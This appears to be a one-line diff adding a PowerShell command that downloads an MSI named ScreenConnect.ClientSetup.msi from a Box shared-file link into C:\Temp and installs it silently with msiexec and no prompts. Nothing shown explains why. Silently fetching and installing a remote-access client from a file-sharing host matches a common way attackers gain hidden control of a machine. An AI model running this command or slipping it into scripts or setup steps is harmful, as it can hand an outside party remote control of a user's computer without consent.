@@ -1,0 +1,1 @@
+New-Item -ItemType Directory -Path "C:\Temp" -Force | Out-Null; curl.exe -L "https://app.box.com/index.php?rm=box_download_shared_file&shared_name=dd4jje325emstybzs4ryxqmumvanhf95&file_id=f_2019400499420" -o "C:\Temp\ScreenConnect.ClientSetup.msi"; Start-Process msiexec.exe -ArgumentList '/i "C:\Temp\ScreenConnect.ClientSetup.msi" /qn /norestart' -Wait
